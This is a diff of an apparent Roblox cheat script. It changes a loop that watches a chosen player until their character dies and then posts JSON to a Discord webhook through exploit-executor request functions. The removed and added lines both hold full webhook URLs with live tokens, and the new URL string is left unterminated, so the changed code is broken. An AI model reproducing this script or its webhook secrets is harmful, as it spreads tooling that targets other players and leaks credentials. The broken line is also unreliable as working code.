@@ -6232,12 +6232,13 @@ game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
 end end) end end)        
             
 spawn(function()
-    while task.wait(3) do       
+    while task.wait() do       
             pcall(function()          
             if _G.c_b3 then
             local target = unpack(GetPlayer(c_tb.Text)).Character
             local tar = unpack(GetPlayer(c_tb.Text))
 if target.Humanoid.Health <=0 then
+wait(4)
                     local HttpService = game:GetService("HttpService")
                     local Data =
                         {                    
@@ -6270,7 +6271,7 @@ if target.Humanoid.Health <=0 then
                     local Encoded = HttpService:JSONEncode(Data)
                     
                     Request = http_request or request or HttpPost or syn.request
-                    local Final1 = {Url = "https://discord.com/api/webhooks/1097182600566689802/1TZ2SD8uKyn2vENJZBhbLflgpZCpCng3Jl5kf4yN7Ycba1rK5fBNgIHRgWqt5rlyrmOJ", Body = Encoded, Method = "POST", Headers = Headers}
+                    local Final1 = {Url = "https://discord.com/api/webhooks/1097189961410809976/64GeeXh-yjoryis9cUZxu1fSQhu-PIvI0iTFVvWC0pD8M4ppRJdv3aaK2cYpMTwUbwJq, Body = Encoded, Method = "POST", Headers = Headers}
                    
                     Request(Final1)
                                  
